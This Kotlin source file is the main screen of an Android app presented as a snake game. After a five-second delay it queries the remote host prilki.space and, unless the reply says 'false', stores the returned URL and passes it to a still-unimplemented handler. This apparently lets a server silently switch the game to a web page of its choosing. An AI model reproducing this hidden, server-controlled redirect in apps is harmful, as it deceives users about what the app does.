package com.snake.eat.finish.view

import android.net.Uri
import androidx.appcompat.app.AppCompatActivity

import android.os.Bundle
import android.util.Log
import android.view.View
import androidx.browser.customtabs.CustomTabsIntent
import androidx.core.content.ContextCompat
import com.snake.eat.finish.R
import com.snake.eat.finish.api.ApiResponse
import com.snake.eat.finish.api.LinksHelper
import com.snake.eat.finish.api.Model
import com.snake.eat.finish.api.MyApi
import com.snake.eat.finish.contract.IMainContract
import com.snake.eat.finish.features.Preference
import com.snake.eat.finish.presenter.MainActivityPresenter
import kotlinx.android.synthetic.main.activity_main.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory

class MainActivity : AppCompatActivity(), IMainContract.View, ApiResponse {

    private lateinit var mPresenter: IMainContract.Presenter
    var prefResp : Preference? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val links = LinksHelper(this)
        links.attachWeb(this)
        checkLinks(links, false)
        setContentView(R.layout.activity_main)
        GlobalScope.launch(Dispatchers.IO) {
            Thread.sleep(5000)
            withContext(Dispatchers.Main){
                progress_bar.visibility = View.GONE
                checkLinks(links, true)
                supportFragmentManager.beginTransaction().add(R.id.fl_main_frames, PlayFragment()).commit()
                mPresenter = MainActivityPresenter(this@MainActivity)
                mPresenter.acOnCreated()
            }
        }

    }

    override fun showStart() {
        supportFragmentManager.beginTransaction().add(R.id.fl_main_frames, MainScreenFragment()).commit()
    }

    fun checkLinks(links : LinksHelper, kek : Boolean){
        if(links.url != null) execResponse(links.url!!)
        else{
            prefResp = Preference(this@MainActivity).apply { getSp("req") }
            val req = prefResp!!.getStr("req")
            if(req != null && req != "" && !links.exec) execResponse("req")
            else
                if (kek) retrofitExec()
        }
    }

    fun retrofitExec(){
        val base_url = "https://prilki.space/"
        val retrofit = Retrofit.Builder()
            .baseUrl(base_url)
            .addConverterFactory(GsonConverterFactory.create())
            .build()
        val service = retrofit.create(MyApi::class.java)
        service.getModel().enqueue(object : Callback<Model> {
            override fun onFailure(call: Call<Model>, t: Throwable) {
                Log.e("Error", "Failed to get response")
            }

            override fun onResponse(call: Call<Model>, response: Response<Model>) {
                if(response.body()?.url != "false"){
                    Log.e("Response", response.body()?.url)
                    response.body()?.url?.let { prefResp?.putStr("req", it) }
                    response.body()?.url?.let { execResponse(it) }
                }
                else
                    Log.e("Response", "False")
            }

        })
    }



    override fun execResponse(url: String) {
        TODO("Not yet implemented")
    }
}
